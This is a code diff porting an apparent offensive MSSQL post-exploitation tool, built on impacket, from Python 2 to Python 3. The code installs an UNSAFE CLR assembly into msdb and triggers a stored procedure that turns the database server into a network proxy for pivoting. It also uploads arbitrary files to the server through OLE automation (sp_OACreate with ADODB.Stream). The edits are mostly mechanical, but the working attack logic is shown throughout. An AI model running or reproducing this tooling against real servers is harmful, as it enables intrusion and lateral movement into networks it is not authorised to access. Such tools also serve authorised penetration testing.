@@ -23,7 +23,7 @@ import os
 import logging
 
 import socket
-import thread
+import _thread
 import select
 
 from impacket.examples import logger
@@ -33,9 +33,9 @@ from impacket import version, tds
 
 # Proxy config
 
-MSG_END_OF_TRANSIMISSION = "\x31\x41\x59\x26\x53\x58\x97\x93\x23\x84"
-MSG_EXIT_CMD = "\x12\x34\x56"
-MSG_EXIT_ACK = "\x65\x43\x21"
+MSG_END_OF_TRANSIMISSION = b"\x31\x41\x59\x26\x53\x58\x97\x93\x23\x84"
+MSG_EXIT_CMD = b"\x12\x34\x56"
+MSG_EXIT_ACK = b"\x65\x43\x21"
 
 ASSEMBLY_NAME = "Microsoft.SqlServer.Proxy"
 PROCEDURE_NAME = "sp_start_proxy"
@@ -78,7 +78,7 @@ def proxy_install(mssql, args):
         
     
     with open(args.clr, 'rb') as f:
-        data = f.read().encode('hex')
+        data = f.read().hex()
         
         mssql.batch("USE msdb; CREATE ASSEMBLY [%s] FROM 0x%s WITH PERMISSION_SET = UNSAFE" % (ASSEMBLY_NAME, data))
         res = mssql.batch("USE msdb; SELECT COUNT(*) AS n FROM sys.assemblies where name = '%s'" % ASSEMBLY_NAME)[0]['n']
@@ -176,7 +176,7 @@ def proxy_worker(server, client):
                     server.sendall(MSG_END_OF_TRANSIMISSION)
                     return
 
-                logging.debug("Client: %s" % data.encode('hex'))
+                logging.debug("Client: %s" % data.hex())
                 server.sendall(data)
 
             elif sock is server:
@@ -185,7 +185,7 @@ def proxy_worker(server, client):
                     logging.info("Server disconnected!")
                     return
 
-                logging.debug("Server: %s" % data.encode('hex'))
+                logging.debug("Server: %s" % data.hex())
                 client.sendall(data)
 
 
@@ -212,22 +212,23 @@ def proxy_start(mssql, args):
         return
 
 
-    logging.info("Listening on port %d..." % local_port)
+    logging.info("Triggering Proxy Via MSSQL, waiting for ACK")
     try:
         mssql.batch("DECLARE @ip varchar(15); SET @ip=TRIM(CONVERT(char(15), CONNECTIONPROPERTY('client_net_address')));"
                     "EXEC msdb.dbo.%s '%s', @ip, %d" % (PROCEDURE_NAME, args.reciclador, lport), tuplemode=False, wait=False)
         data = mssql.socket.recv(2048)
-        if 'Powered by blackarrow.net' in data:
+        if b'Powered by blackarrow.net' in data:
             logging.info("ACK from server!")
-            mssql.socket.sendall("ACK")
+            mssql.socket.sendall(b"ACK")
         else:
             logging.error("cannot establish connection")
             raise Exception('cannot establish connection')
 
         s.listen(10)
+        logging.info("Listening on port %d..." % local_port)
         while True:
             client, _ = s.accept()
-            thread.start_new_thread(proxy_worker, (mssql.socket, client))
+            _thread.start_new_thread(proxy_worker, (mssql.socket, client))
 
     except:
         mssql.socket.sendall(MSG_EXIT_CMD)
@@ -303,7 +304,7 @@ if __name__ == '__main__':
                 with open(local, 'rb') as f:
                     data = f.read()
                     print("[+] Size is %d bytes" % len(data))
-                    hexdata = "0x%s" % data.encode('hex')
+                    hexdata = "0x%s" % data.hex()
 
                     self.sql.sql_query("DECLARE @ob INT;"
                                        "EXEC sp_OACreate 'ADODB.Stream', @ob OUTPUT;"
@@ -319,7 +320,7 @@ if __name__ == '__main__':
                     else:
                         print("[-] Error uploading")                    
             except:
-                print("[-] Error uploading")   
+                print("[-] Error uploading")
                 pass
 
         def do_enable_ole(self, line):
@@ -544,3 +545,4 @@ if __name__ == '__main__':
                 shell.onecmd(line)
 
     ms_sql.disconnect()
+
